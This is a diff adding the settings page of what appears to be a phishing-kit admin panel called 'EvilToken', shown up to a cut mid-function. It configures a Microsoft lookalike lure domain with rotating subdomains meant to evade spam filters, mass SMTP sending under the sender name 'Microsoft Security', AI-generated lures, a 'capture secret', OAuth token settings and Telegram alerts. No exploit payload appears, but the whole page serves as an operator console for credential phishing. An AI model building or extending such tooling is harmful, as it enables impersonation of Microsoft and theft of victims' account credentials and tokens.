@@ -1,0 +1,814 @@
+{% extends "base.html" %}
+{% block title %}Settings{% endblock %}
+{% block page_title %}⚙️ System Settings{% endblock %}
+
+{% block content %}
+
+<!-- ============================================================
+SUBDOMAIN ROTATION - ADVANCED CONTROL
+============================================================ -->
+<div class="glass" style="border-left: 4px solid #ff9800; margin-bottom: 24px;">
+    <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 12px;">
+        <h3 style="margin: 0;"><i class="fas fa-globe" style="color: #ff9800;"></i> 🌐 Subdomain Rotation</h3>
+        <span id="rotationBadge" style="font-size: 13px; padding: 4px 12px; border-radius: 12px; background: {% if settings.rotation_enabled == '1' %}rgba(76, 175, 80, 0.15){% else %}rgba(244, 67, 54, 0.15){% endif %}; color: {% if settings.rotation_enabled == '1' %}#4caf50{% else %}#f44336{% endif %};">
+            {% if settings.rotation_enabled == '1' %}● ACTIVE{% else %}● INACTIVE{% endif %}
+        </span>
+    </div>
+    
+    <p style="color: var(--text-muted); font-size: 13px; margin-bottom: 16px;">
+        Automatically rotate through subdomains to improve email deliverability and avoid spam filters.
+    </p>
+    
+    <!-- Status Grid -->
+    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 12px; margin: 12px 0; padding: 16px; background: var(--bg-secondary); border-radius: 8px;">
+        <div>
+            <div style="font-size: 12px; color: var(--text-muted);">Current Subdomain</div>
+            <div id="currentSubdomain" style="font-weight: bold; font-size: 18px; color: #4caf50;">{{ settings.current_subdomain or 'auth' }}</div>
+        </div>
+        <div>
+            <div style="font-size: 12px; color: var(--text-muted);">Base URL</div>
+            <div id="baseUrlDisplay" style="font-weight: bold; font-size: 14px; color: #2196f3; word-break: break-all;">{{ settings.base_url or 'https://auth.microsoftonline-auth.us' }}</div>
+        </div>
+        <div>
+            <div style="font-size: 12px; color: var(--text-muted);">Index (Position)</div>
+            <div id="subdomainIndex" style="font-weight: bold; font-size: 18px; color: #9c27b0;">{{ settings.subdomain_index or '0' }}</div>
+            <div style="font-size: 11px; color: var(--text-muted);">Next: 
+                {% set subdomains = ['auth','secure','login','verify','account','portal','office','outlook','help','support','docs','teams'] %}
+                {% set next_idx = (settings.subdomain_index|int + 1) % 12 %}
+                {{ subdomains[next_idx] }}
+            </div>
+        </div>
+        <div>
+            <div style="font-size: 12px; color: var(--text-muted);">Status</div>
+            <div id="rotationStatus" style="font-weight: bold; font-size: 16px; color: {% if settings.rotation_enabled == '1' %}#4caf50{% else %}#f44336{% endif %};">
+                {% if settings.rotation_enabled == '1' %}✅ ENABLED{% else %}❌ DISABLED{% endif %}
+            </div>
+        </div>
+    </div>
+    
+    <!-- Controls -->
+    <div style="display: flex; flex-wrap: wrap; gap: 10px; align-items: center;">
+        <div style="display: flex; gap: 6px;">
+            <form action="/toggle_rotation" method="POST" style="display: inline;" id="enableForm">
+                <button type="submit" class="btn btn-success" style="padding: 8px 20px; {% if settings.rotation_enabled == '1' %}display: none;{% endif %}">
+                    <i class="fas fa-play"></i> Enable Rotation
+                </button>
+            </form>
+            <form action="/toggle_rotation" method="POST" style="display: inline;" id="disableForm">
+                <button type="submit" class="btn btn-danger" style="padding: 8px 20px; {% if settings.rotation_enabled == '0' %}display: none;{% endif %}">
+                    <i class="fas fa-pause"></i> Disable Rotation
+                </button>
+            </form>
+        </div>
+        <a href="/rotate_now" class="btn btn-primary" style="padding: 8px 20px;">
+            <i class="fas fa-sync"></i> Rotate Now
+        </a>
+        <form action="/set_subdomain" method="POST" style="display: inline-flex; gap: 8px; align-items: center; margin-left: 10px;">
+            <select name="subdomain" style="padding: 8px 12px; border-radius: 6px; border: 1px solid var(--border); background: var(--input-bg); color: var(--text-primary);">
+                {% set subdomains = ['auth','secure','login','verify','account','portal','office','outlook','help','support','docs','teams'] %}
+                {% for sub in subdomains %}
+                <option value="{{ sub }}" {% if settings.current_subdomain == sub %}selected{% endif %}>{{ sub }}</option>
+                {% endfor %}
+            </select>
+            <button type="submit" class="btn btn-success">Set</button>
+        </form>
+    </div>
+    
+    <!-- Rotation Cycle Preview -->
+    <div style="margin-top: 12px; padding: 12px; background: var(--bg-secondary); border-radius: 8px;">
+        <div style="font-size: 12px; color: var(--text-muted); margin-bottom: 6px;">Rotation Cycle:</div>
+        <div id="cycleContainer" style="display: flex; flex-wrap: wrap; gap: 4px;">
+            {% set subdomains = ['auth','secure','login','verify','account','portal','office','outlook','help','support','docs','teams'] %}
+            {% for sub in subdomains %}
+                {% if sub == settings.current_subdomain %}
+                    <span style="padding: 2px 8px; border-radius: 4px; background: #4caf50; color: white; font-size: 12px; font-weight: bold;">{{ sub }}</span>
+                {% else %}
+                    <span style="padding: 2px 8px; border-radius: 4px; background: var(--border); color: var(--text-muted); font-size: 12px;">{{ sub }}</span>
+                {% endif %}
+            {% endfor %}
+        </div>
+        <div style="font-size: 11px; color: var(--text-muted); margin-top: 4px;">
+            <span style="color: #4caf50;">●</span> Current &nbsp;|&nbsp; <span style="color: var(--text-muted);">○</span> Available
+        </div>
+    </div>
+    
+    <small style="color: var(--text-muted); margin-top: 8px; display: block; font-size: 12px;">
+        <i class="fas fa-info-circle"></i> 
+        <strong>How it works:</strong> When enabled, the system automatically rotates through subdomains to improve email deliverability.
+        <br>
+        <i class="fas fa-sync"></i> 
+        <strong>Auto-Rotation:</strong> {% if settings.rotation_enabled == '1' %}✅ ENABLED - Will rotate on each campaign send{% else %}❌ DISABLED - Manual rotation only{% endif %}
+    </small>
+</div>
+
+<!-- ============================================================
+MAIN SETTINGS - SMTP & PERFORMANCE
+============================================================ -->
+<form method="POST" action="/settings">
+<div style="display: grid; grid-template-columns: 1fr 1fr; gap: 24px; margin-bottom: 24px;">
+    
+    <!-- LEFT: SMTP Configuration -->
+    <div class="glass" style="border-left: 4px solid #007bff;">
+        <h3><i class="fas fa-envelope" style="color: #007bff;"></i> 📧 SMTP Configuration</h3>
+        <p style="color: var(--text-muted); font-size: 13px; margin-bottom: 16px;">Configure your primary email server.</p>
+        
+        <div class="form-group">
+            <label>SMTP Server</label>
+            <input type="text" name="smtp_server" value="{{ settings.smtp_server or '' }}" class="form-control" placeholder="smtp.office365.com">
+        </div>
+        <div class="form-group">
+            <label>Port</label>
+            <input type="number" name="smtp_port" value="{{ settings.smtp_port or '587' }}" class="form-control" placeholder="587">
+        </div>
+        <div class="form-group">
+            <label>Username</label>
+            <input type="text" name="smtp_username" value="{{ settings.smtp_username or '' }}" class="form-control" placeholder="user@domain.com">
+        </div>
+        <div class="form-group">
+            <label>Password</label>
+            <input type="password" name="smtp_password" value="{{ settings.smtp_password or '' }}" class="form-control" placeholder="••••••••">
+        </div>
+        <div class="form-group">
+            <label>From Email</label>
+            <input type="email" name="smtp_from" value="{{ settings.smtp_from or '' }}" class="form-control" placeholder="noreply@domain.com">
+        </div>
+        <div class="form-group">
+            <label>Sender Name</label>
+            <input type="text" name="sender_name" value="{{ settings.sender_name or 'Microsoft Security' }}" class="form-control" placeholder="Microsoft Security">
+        </div>
+    </div>
+    
+    <!-- RIGHT: Performance & AI -->
+    <div class="glass" style="border-left: 4px solid #9c27b0;">
+        <h3><i class="fas fa-sliders-h" style="color: #9c27b0;"></i> ⚡ Performance & AI</h3>
+        <p style="color: var(--text-muted); font-size: 13px; margin-bottom: 16px;">Configure sending limits and AI features.</p>
+        
+        <div class="form-group">
+            <label>Base URL</label>
+            <input type="text" name="base_url" value="{{ settings.base_url or '' }}" class="form-control" placeholder="https://your-domain.com">
+        </div>
+        <div class="form-group">
+            <label>Max Threads</label>
+            <select name="max_workers" class="form-control">
+                <option value="2" {% if settings.max_workers == '2' %}selected{% endif %}>2 - Slow (60/min)</option>
+                <option value="5" {% if settings.max_workers == '5' %}selected{% endif %}>5 - Normal (150/min)</option>
+                <option value="10" {% if settings.max_workers == '10' %}selected{% endif %}>10 - Fast (300/min)</option>
+                <option value="15" {% if settings.max_workers == '15' %}selected{% endif %}>15 - Turbo (450/min)</option>
+                <option value="20" {% if settings.max_workers == '20' %}selected{% endif %}>20 - Max (600/min)</option>
+            </select>
+        </div>
+        <div class="form-group">
+            <label>Rate Limit (per minute)</label>
+            <input type="number" name="rate_limit_per_minute" value="{{ settings.rate_limit_per_minute or '60' }}" class="form-control" placeholder="60">
+        </div>
+        
+        <hr style="margin: 16px 0;">
+        
+        <div class="form-group">
+            <label>OpenAI API Key</label>
+            <input type="password" name="openai_api_key" value="{{ settings.openai_api_key or '' }}" class="form-control" placeholder="sk-...">
+        </div>
+        <div class="form-group" style="display: flex; align-items: center; gap: 12px; margin-bottom: 0;">
+            <label style="margin: 0; cursor: pointer;">Enable AI Lures</label>
+            <input type="checkbox" name="enable_ai_lures" value="true" {% if settings.enable_ai_lures == 'true' %}checked{% endif %} style="width: 18px; height: 18px; cursor: pointer;">
+            <span style="font-size: 12px; color: var(--text-muted);">(requires OpenAI key)</span>
+        </div>
+    </div>
+</div>
+
+<!-- ============================================================
+SAVE BUTTON
+============================================================ -->
+<div style="margin-bottom: 24px;">
+    <button type="submit" class="btn btn-primary" style="padding: 12px 32px; width: 100%;">
+        <i class="fas fa-save"></i> Save All Settings
+    </button>
+</div>
+</form>
+
+<!-- ============================================================
+SMTP ROTATION PROVIDERS
+============================================================ -->
+<div class="glass" style="border-left: 4px solid #28a745; margin-bottom: 24px;">
+    <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 12px;">
+        <h3 style="margin: 0;"><i class="fas fa-exchange-alt" style="color: #28a745;"></i> 🔄 SMTP Rotation Providers</h3>
+        <span style="font-size: 13px; color: var(--text-muted);">{{ smtp_providers|length }} providers</span>
+    </div>
+    <p style="color: var(--text-muted); font-size: 13px; margin-bottom: 16px;">Add multiple SMTP providers for automatic rotation and failover.</p>
+    
+    <!-- Add Provider -->
+    <div style="background: var(--bg-secondary); padding: 16px; border-radius: 8px; margin-bottom: 16px;">
+        <h4 style="margin: 0 0 12px 0; font-size: 15px;">➕ Add New Provider</h4>
+        <form action="/smtp/add" method="POST">
+            <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px;">
+                <input type="text" name="name" placeholder="Provider Name" class="form-control" required>
+                <input type="text" name="server" placeholder="SMTP Server" class="form-control" required>
+                <input type="number" name="port" placeholder="Port" value="587" class="form-control" required>
+                <input type="text" name="username" placeholder="Username" class="form-control" required>
+                <input type="password" name="password" placeholder="Password" class="form-control" required>
+                <input type="email" name="from_email" placeholder="From Email" class="form-control" required>
+            </div>
+            <button type="submit" class="btn btn-success" style="margin-top: 10px;">
+                <i class="fas fa-plus"></i> Add Provider
+            </button>
+        </form>
+    </div>
+    
+    <!-- Providers List -->
+    {% if smtp_providers %}
+    <div class="table-wrap">
+        <table>
+            <thead>
+                <tr>
+                    <th>Name</th>
+                    <th>Server</th>
+                    <th>From</th>
+                    <th style="text-align: center;">Status</th>
+                    <th style="text-align: center;">Score</th>
+                    <th style="text-align: center;">Actions</th>
+                </tr>
+            </thead>
+            <tbody>
+                {% for p in smtp_providers %}
+                <tr>
+                    <td><strong>{{ p.name }}</strong></td>
+                    <td>{{ p.server }}</td>
+                    <td>{{ p.from_email }}</td>
+                    <td style="text-align: center;">
+                        {% if p.enabled %}
+                            <span style="color: #4caf50;">● Active</span>
+                        {% else %}
+                            <span style="color: #f44336;">● Inactive</span>
+                        {% endif %}
+                    </td>
+                    <td style="text-align: center;">
+                        <span style="background: var(--bg-secondary); padding: 2px 12px; border-radius: 12px; font-size: 13px;">{{ p.score or 100 }}</span>
+                    </td>
+                    <td style="text-align: center; white-space: nowrap;">
+                        <form action="/smtp/{{ p.id }}/toggle" method="POST" style="display: inline;">
+                            <button type="submit" class="btn btn-sm {% if p.enabled %}btn-warning{% else %}btn-success{% endif %}">
+                                {% if p.enabled %}Disable{% else %}Enable{% endif %}
+                            </button>
+                        </form>
+                        <button class="btn btn-sm btn-primary" onclick="testSmtp({{ p.id }}, '{{ p.name }}')">Test</button>
+                        <form action="/smtp/{{ p.id }}/delete" method="POST" style="display: inline;">
+                            <button type="submit" class="btn btn-sm btn-danger" onclick="return confirm('Delete this provider?')">
+                                <i class="fas fa-trash"></i>
+                            </button>
+                        </form>
+                    </td>
+                </tr>
+                {% endfor %}
+            </tbody>
+        </table>
+    </div>
+    {% else %}
+    <p style="color: var(--text-muted); text-align: center; padding: 20px 0;">No SMTP providers added yet.</p>
+    {% endif %}
+</div>
+
+<!-- ============================================================
+TEST EMAIL
+============================================================ -->
+<div class="glass" style="border-left: 4px solid #17a2b8; margin-bottom: 24px;">
+    <h3><i class="fas fa-paper-plane" style="color: #17a2b8;"></i> 📤 Send Test Email</h3>
+    <p style="color: var(--text-muted); font-size: 13px; margin-bottom: 16px;">Verify your SMTP configuration by sending a test email.</p>
+    
+    <div style="display: flex; gap: 12px; flex-wrap: wrap; align-items: center;">
+        <input type="email" id="testEmailInput" placeholder="Enter recipient email..." style="flex: 2; min-width: 250px; padding: 10px 16px; border-radius: 6px; border: 1px solid var(--border); background: var(--input-bg); color: var(--text-primary);">
+        <input type="text" id="testSubjectInput" placeholder="Subject (optional)" style="flex: 1; min-width: 150px; padding: 10px 16px; border-radius: 6px; border: 1px solid var(--border); background: var(--input-bg); color: var(--text-primary);">
+        <button onclick="sendTestEmailWithInput()" class="btn btn-primary" style="padding: 10px 24px;">
+            <i class="fas fa-paper-plane"></i> Send
+        </button>
+    </div>
+    <div id="testEmailResult" style="margin-top: 12px; display: none; padding: 10px; border-radius: 6px;"></div>
+
+<!-- ============================================================
+LURE DOMAIN MANAGEMENT
+============================================================ -->
+<div class="glass" style="border-left: 4px solid #9c27b0; margin-top: 24px; border-radius: 12px; padding: 20px;">
+    <h3><i class="fas fa-globe" style="color: #9c27b0;"></i> 🎯 Lure Domain Management</h3>
+    <form id="domainForm" onsubmit="updateLureDomain(event)">
+        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin: 16px 0;">
+            <div><label>New Domain</label><input type="text" id="newLureDomain" class="form-control" placeholder="newdomain.com"></div>
+            <div><label>Subdomains</label><input type="text" id="newLureSubdomains" class="form-control" value="auth, secure, login, verify, account, portal, office, outlook, help, support, docs, teams"></div>
+        </div>
+        <button type="submit" class="btn btn-primary">Update Lure Domain</button>
+        <div id="domainUpdateStatus" style="margin-top: 10px;"></div>
+    </form>
+</div>
+
+<!-- ============================================================
+WORKER DOMAINS MANAGEMENT
+============================================================ -->
+<div class="glass" style="border-left: 4px solid #ff9800; margin-top: 24px; border-radius: 12px; padding: 20px;">
+    <h3><i class="fas fa-link" style="color: #ff9800;"></i> 🔗 Worker Domains</h3>
+    <div style="display: flex; gap: 10px; margin: 16px 0;">
+        <input type="text" id="newWorkerDomain" class="form-control" placeholder="worker.yourdomain.com">
+        <button onclick="addWorkerDomain()" class="btn btn-success">Add</button>
+    </div>
+    <div id="workerDomainsList"><div style="text-align: center; padding: 20px; color: var(--text-muted);">Loading...</div></div>
+    <div id="workerDomainStatus" style="margin-top: 10px;"></div>
+</div>
+
+<!-- ============================================================
+TELEGRAM SETTINGS
+============================================================ -->
+<div class="glass" style="border-left: 4px solid #00bcd4; margin-top: 24px; border-radius: 12px; padding: 20px;">
+    <h3><i class="fab fa-telegram" style="color: #00bcd4;"></i> 🤖 Telegram Notifications</h3>
+    <form id="telegramForm" onsubmit="updateTelegram(event)">
+        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin: 16px 0;">
+            <div><label>Bot Token</label><input type="text" id="telegramBotToken" class="form-control"></div>
+            <div><label>Chat ID</label><input type="text" id="telegramChatId" class="form-control"></div>
+        </div>
+        <div style="display: flex; gap: 10px; margin-bottom: 16px;">
+            <label><input type="checkbox" id="telegramEnabled" checked> Enable</label>
+            <span id="telegramStatus" style="font-size: 13px; color: var(--text-muted);">Status: <span id="telegramStatusText">Loading...</span></span>
+        </div>
+        <button type="submit" class="btn btn-primary">Save</button>
+        <button type="button" class="btn btn-success" onclick="testTelegram()">Send Test</button>
+        <div id="telegramUpdateStatus" style="margin-top: 10px;"></div>
+    </form>
+</div>
+
+<!-- ============================================================
+ALLOWED_HOSTS MANAGEMENT
+============================================================ -->
+<div class="glass" style="border-left: 4px solid #e91e63; margin-top: 24px; border-radius: 12px; padding: 20px;">
+    <h3><i class="fas fa-shield-alt" style="color: #e91e63;"></i> 🔐 Admin Access Control</h3>
+    <div style="display: flex; gap: 10px; margin: 16px 0;">
+        <input type="text" id="newAllowedHost" class="form-control" placeholder="admin.yourdomain.com or IP">
+        <button onclick="addAllowedHost()" class="btn btn-success">Add</button>
+    </div>
+    <div id="allowedHostsList"><div style="text-align: center; padding: 20px; color: var(--text-muted);">Loading...</div></div>
+    <div id="allowedHostStatus" style="margin-top: 10px;"></div>
+</div>
+
+<!-- ============================================================
+SECRETS & OAUTH SETTINGS
+============================================================ -->
+<div class="glass" style="border-left: 4px solid #ff5722; margin-top: 24px; border-radius: 12px; padding: 20px;">
+    <h3><i class="fas fa-key" style="color: #ff5722;"></i> 🔑 Secrets & OAuth Settings</h3>
+    <form id="secretsForm" onsubmit="updateSecrets(event)">
+        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin: 16px 0;">
+            <div><label>Worker Secret</label><input type="text" id="workerSecret" class="form-control"></div>
+            <div><label>Capture Secret</label><input type="text" id="captureSecret" class="form-control"></div>
+            <div><label>OAuth Client ID</label><input type="text" id="oauthClientId" class="form-control"></div>
+            <div><label>OAuth Tenant ID</label><input type="text" id="oauthTenantId" class="form-control"></div>
+        </div>
+        <div style="margin-bottom: 16px;">
+            <label>OAuth Scopes</label>
+            <input type="text" id="oauthScopes" class="form-control">
+        </div>
+        <button type="submit" class="btn btn-primary">Save</button>
+        <div id="secretsUpdateStatus" style="margin-top: 10px;"></div>
+    </form>
+</div>
+
+<script>
+// Load functions
+function loadLureDomain() {
+    fetch('/api/domain_status')
+        .then(res => res.json())
+        .then(data => {
+            document.getElementById('newLureDomain').value = data.domain || '';
+            if (data.subdomains) {
+                document.getElementById('newLureSubdomains').value = data.subdomains.join(', ');
+            }
+        });
+}
+
+function updateLureDomain(e) {
+    e.preventDefault();
+    const domain = document.getElementById('newLureDomain').value.trim();
+    const subdomains = document.getElementById('newLureSubdomains').value.split(',').map(s => s.trim());
+    const status = document.getElementById('domainUpdateStatus');
+    status.innerHTML = '⏳ Updating...';
+    fetch('/api/update_domain', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ domain: domain, subdomains: subdomains })
+    })
+    .then(res => res.json())
+    .then(data => {
+        status.innerHTML = data.error ? '❌ ' + data.error : '✅ ' + data.message;
+        if (!data.error) setTimeout(() => location.reload(), 1500);
+    })
+    .catch(err => status.innerHTML = '❌ Error: ' + err.message);
+}
+
+function loadWorkerDomains() {
+    const container = document.getElementById('workerDomainsList');
+    fetch('/api/worker_domains')
+        .then(res => res.json())
+        .then(data => {
+            if (data.length === 0) { container.innerHTML = '<div style="text-align: center; padding: 20px; color: var(--text-muted);">No worker domains</div>'; return; }
+            let html = '<div style="border: 1px solid var(--border); border-radius: 8px;">';
+            data.forEach((d, i) => {
+                const color = d.enabled === 1 ? '#4caf50' : '#f44336';
+                html += `<div style="display: grid; grid-template-columns: 40px 1fr 80px 50px 50px; gap: 10px; padding: 10px; border-bottom: 1px solid var(--border);">
+                    <div>${i+1}</div><div>${d.domain}</div>
+                    <div><span style="background: ${color}20; color: ${color}; padding: 2px 10px; border-radius: 12px;">${d.enabled === 1 ? 'Active' : 'Inactive'}</span></div>
+                    <div><button onclick="toggleWorkerDomain(${d.id})">${d.enabled === 1 ? '⏸' : '▶️'}</button></div>
+                    <div><button onclick="deleteWorkerDomain(${d.id})" style="color:#f44336;">🗑</button></div>
+                </div>`;
+            });
+            html += '</div>';
+            container.innerHTML = html;
+        });
+}
+
+function addWorkerDomain() {
+    const input = document.getElementById('newWorkerDomain');
+    const domain = input.value.trim();
+    if (!domain) { alert('Please enter a domain'); return; }
+    fetch('/api/worker_domains', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ domain: domain })
+    })
+    .then(res => res.json())
+    .then(data => {
+        if (data.error) { alert('❌ ' + data.error); } else { input.value = ''; loadWorkerDomains(); }
+    });
+}
+
+function toggleWorkerDomain(id) {
+    fetch(`/api/worker_domains/${id}/toggle`, { method: 'POST' })
+        .then(res => res.json())
+        .then(data => {
+            if (data.error) { alert('❌ ' + data.error); } else { loadWorkerDomains(); }
+        });
+}
+
+function deleteWorkerDomain(id) {
+    if (!confirm('Delete this worker domain?')) return;
+    fetch(`/api/worker_domains/${id}`, { method: 'DELETE' })
+        .then(res => res.json())
+        .then(data => {
+            if (data.error) { alert('❌ ' + data.error); } else { loadWorkerDomains(); }
+        });
+}
+
+function loadTelegramSettings() {
+    fetch('/api/telegram/settings')
+        .then(res => res.json())
+        .then(data => {
+            document.getElementById('telegramBotToken').value = data.bot_token || '';
+            document.getElementById('telegramChatId').value = data.chat_id || '';
+            document.getElementById('telegramEnabled').checked = data.enabled === 1;
+            const statusText = document.getElementById('telegramStatusText');
+            if (data.bot_token && data.chat_id) {
+                statusText.textContent = '✅ Configured';
+                statusText.style.color = '#4caf50';
+            } else {
+                statusText.textContent = '⚠️ Not configured';
+                statusText.style.color = '#ff9800';
+            }
+        });
+}
+
+function updateTelegram(e) {
+    e.preventDefault();
+    const data = {
+        bot_token: document.getElementById('telegramBotToken').value.trim(),
+        chat_id: document.getElementById('telegramChatId').value.trim(),
+        enabled: document.getElementById('telegramEnabled').checked
+    };
+    const statusDiv = document.getElementById('telegramUpdateStatus');
+    statusDiv.innerHTML = '⏳ Saving...';
+    fetch('/api/telegram/settings', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+    })
+    .then(res => res.json())
+    .then(data => {
+        statusDiv.innerHTML = data.error ? '❌ ' + data.error : '✅ ' + data.message;
+        if (!data.error) loadTelegramSettings();
+    })
+    .catch(err => statusDiv.innerHTML = '❌ Error: ' + err.message);
+}
+
+function testTelegram() {
+    const token = document.getElementById('telegramBotToken').value.trim();
+    const chatId = document.getElementById('telegramChatId').value.trim();
+    if (!token || !chatId) { alert('Please enter Bot Token and Chat ID'); return; }
+    const statusDiv = document.getElementById('telegramUpdateStatus');
+    statusDiv.innerHTML = '⏳ Sending test...';
+    fetch('/api/telegram/test', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ bot_token: token, chat_id: chatId })
+    })
+    .then(res => res.json())
+    .then(data => {
+        statusDiv.innerHTML = data.error ? '❌ ' + data.error : '✅ ' + data.message;
+    })
+    .catch(err => statusDiv.innerHTML = '❌ Error: ' + err.message);
+}
+
+function loadAllowedHosts() {
+    const container = document.getElementById('allowedHostsList');
+    fetch('/api/allowed_hosts')
+        .then(res => res.json())
+        .then(data => {
+            if (data.length === 0) { container.innerHTML = '<div style="text-align: center; padding: 20px; color: var(--text-muted);">No allowed hosts</div>'; return; }
+            let html = '<div style="border: 1px solid var(--border); border-radius: 8px;">';
+            data.forEach((d, i) => {
+                const color = d.enabled === 1 ? '#4caf50' : '#f44336';
+                html += `<div style="display: grid; grid-template-columns: 40px 1fr 80px 50px 50px; gap: 10px; padding: 10px; border-bottom: 1px solid var(--border);">
+                    <div>${i+1}</div><div>${d.host}</div>
+                    <div><span style="background: ${color}20; color: ${color}; padding: 2px 10px; border-radius: 12px;">${d.enabled === 1 ? 'Active' : 'Inactive'}</span></div>
+                    <div><button onclick="toggleAllowedHost(${d.id})">${d.enabled === 1 ? '⏸' : '▶️'}</button></div>
+                    <div><button onclick="deleteAllowedHost(${d.id})" style="color:#f44336;">🗑</button></div>
+                </div>`;
+            });
+            html += '</div>';
+            container.innerHTML = html;
+        });
+}
+
+function addAllowedHost() {
+    const input = document.getElementById('newAllowedHost');
+    const host = input.value.trim();
+    if (!host) { alert('Please enter a host'); return; }
+    fetch('/api/allowed_hosts', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ host: host })
+    })
+    .then(res => res.json())
+    .then(data => {
+        if (data.error) { alert('❌ ' + data.error); } else { input.value = ''; loadAllowedHosts(); }
+    });
+}
+
+function toggleAllowedHost(id) {
+    fetch(`/api/allowed_hosts/${id}/toggle`, { method: 'POST' })
+        .then(res => res.json())
+        .then(data => {
+            if (data.error) { alert('❌ ' + data.error); } else { loadAllowedHosts(); }
+        });
+}
+
+function deleteAllowedHost(id) {
+    if (!confirm('Delete this allowed host?')) return;
+    fetch(`/api/allowed_hosts/${id}`, { method: 'DELETE' })
+        .then(res => res.json())
+        .then(data => {
+            if (data.error) { alert('❌ ' + data.error); } else { loadAllowedHosts(); }
+        });
+}
+
+function loadSecrets() {
+    fetch('/api/secrets')
+        .then(res => res.json())
+        .then(data => {
+            document.getElementById('workerSecret').value = data.worker_secret || '';
+            document.getElementById('captureSecret').value = data.capture_secret || '';
+            document.getElementById('oauthClientId').value = data.oauth_client_id || '';
+            document.getElementById('oauthTenantId').value = data.oauth_tenant_id || '';
+            document.getElementById('oauthScopes').value = data.oauth_scopes || '';
+        });
+}
+
+function updateSecrets(e) {
+    e.preventDefault();
+    const data = {
+        worker_secret: document.getElementById('workerSecret').value.trim(),
+        capture_secret: document.getElementById('captureSecret').value.trim(),
+        oauth_client_id: document.getElementById('oauthClientId').value.trim(),
+        oauth_tenant_id: document.getElementById('oauthTenantId').value.trim(),
+        oauth_scopes: document.getElementById('oauthScopes').value.trim()
+    };
+    const statusDiv = document.getElementById('secretsUpdateStatus');
+    statusDiv.innerHTML = '⏳ Saving...';
+    fetch('/api/secrets', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+    })
+    .then(res => res.json())
+    .then(data => {
+        statusDiv.innerHTML = data.error ? '❌ ' + data.error : '✅ ' + data.message;
+    })
+    .catch(err => statusDiv.innerHTML = '❌ Error: ' + err.message);
+}
+
+document.addEventListener('DOMContentLoaded', function() {
+    loadLureDomain();
+    loadWorkerDomains();
+    loadTelegramSettings();
+    loadAllowedHosts();
+    loadSecrets();
+});
+</script>
+
+</div>
+
+<script>
+function sendTestEmailWithInput() {
+    const email = document.getElementById('testEmailInput').value;
+    const subject = document.getElementById('testSubjectInput').value || 'Test Email';
+    const resultDiv = document.getElementById('testEmailResult');
+    
+    if (!email) {
+        resultDiv.style.display = 'block';
+        resultDiv.style.background = 'rgba(244, 67, 54, 0.1)';
+        resultDiv.style.color = '#f44336';
+        resultDiv.innerHTML = '❌ Please enter a recipient email address.';
+        return;
+    }
+    
+    resultDiv.style.display = 'block';
+    resultDiv.style.background = 'rgba(33, 150, 243, 0.1)';
+    resultDiv.style.color = '#2196f3';
+    resultDiv.innerHTML = '📤 Sending test email...';
+    
+    const formData = new FormData();
+    formData.append('test_email', email);
+    formData.append('subject', subject);
+    formData.append('body', '<p>Test email from EvilToken</p>');
+    
+    fetch('/test_email', {
+        method: 'POST',
+        body: formData
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            resultDiv.style.background = 'rgba(76, 175, 80, 0.1)';
+            resultDiv.style.color = '#4caf50';
+            resultDiv.innerHTML = '✅ ' + data.message;
+        } else {
+            resultDiv.style.background = 'rgba(244, 67, 54, 0.1)';
+            resultDiv.style.color = '#f44336';
+            resultDiv.innerHTML = '❌ ' + (data.error || 'Failed to send test email.');
+        }
+    })
+    .catch(error => {
+        resultDiv.style.background = 'rgba(244, 67, 54, 0.1)';
+        resultDiv.style.color = '#f44336';
+        resultDiv.innerHTML = '❌ Error: ' + error.message;
+    });
+}
+
+function testSmtp(id, name) {
+    const email = prompt('Enter test email address for ' + name + ':');
+    if (!email) return;
+    
+    const formData = new FormData();
+    formData.append('provider_id', id);
+    formData.append('test_email', email);
+    
+    fetch('/smtp/test', {
+        method: 'POST',
+        body: formData
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            alert('✅ Test email sent via ' + name);
+        } else {
+            alert('❌ Failed via ' + name + ': ' + (data.error || 'Unknown error'));
+        }
+    })
+    .catch(error => alert('Error: ' + error.message));
+}
+
+// ============================================================
+// DYNAMIC SUBDOMAIN STATUS UPDATER
+// ============================================================
+function updateSubdomainStatus() {
+    fetch('/api/subdomain_status')
+        .then(response => response.json())
+        .then(data => {
+            // Update current subdomain
+            const currentEl = document.getElementById('currentSubdomain');
+            if (currentEl) currentEl.textContent = data.current_subdomain || 'auth';
+            
+            // Update base URL
+            const baseUrlEl = document.getElementById('baseUrlDisplay');
+            if (baseUrlEl) baseUrlEl.textContent = data.base_url || '';
+            
+            // Update index
+            const indexEl = document.getElementById('subdomainIndex');
+            if (indexEl) indexEl.textContent = data.subdomain_index || '0';
+            
+            // Update rotation status
+            const statusEl = document.getElementById('rotationStatus');
+            const badgeEl = document.getElementById('rotationBadge');
+            const enableBtn = document.querySelector('#enableForm button');
+            const disableBtn = document.querySelector('#disableForm button');
+            
+            if (data.rotation_enabled == 1) {
+                if (statusEl) {
+                    statusEl.textContent = '✅ ENABLED';
+                    statusEl.style.color = '#4caf50';
+                }
+                if (badgeEl) {
+                    badgeEl.textContent = '● Active';
+                    badgeEl.style.color = '#4caf50';
+                }
+                if (enableBtn) enableBtn.style.display = 'none';
+                if (disableBtn) disableBtn.style.display = 'inline-flex';
+            } else {
+                if (statusEl) {
+                    statusEl.textContent = '❌ DISABLED';
+                    statusEl.style.color = '#f44336';
+                }
+                if (badgeEl) {
+                    badgeEl.textContent = '● Inactive';
+                    badgeEl.style.color = '#f44336';
+                }
+                if (enableBtn) enableBtn.style.display = 'inline-flex';
+                if (disableBtn) disableBtn.style.display = 'none';
+            }
+            
